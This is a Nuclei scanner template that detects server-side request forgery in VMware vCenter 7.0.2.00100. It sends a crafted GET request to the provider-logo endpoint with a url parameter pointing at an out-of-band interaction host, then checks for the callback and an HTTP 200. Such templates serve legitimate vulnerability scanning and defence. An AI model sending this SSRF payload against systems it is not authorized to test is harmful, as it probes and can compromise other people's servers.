id: vmware-vcenter-ssrf
info:
  name: VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site
    Scripting
  author: pdteam
  severity: critical
  description: VMware vCenter 7.0.2.00100 is vulnerable to server-side request forgery,
    local file inclusion, and cross-site scripting.
  reference:
  - https://github.com/l0ggg/VMware_vCenter
  tags: ssrf,lfi,xss,oast,vcenter,vmware
  metadata:
    impact: The vulnerability in VMware vCenter 7.0.2.00100 can have a devastating
      impact on the security of affected systems, as it can lead to unauthorized access
      to sensitive information and system compromise.
    recommendation: It is recommended that users update VMware vCenter 7.0.2.00100
      to address its susceptibility to server-side request forgery, local file inclusion,
      and cross-site scripting vulnerabilities.
requests:
- method: GET
  path:
  - '{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}'
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 200
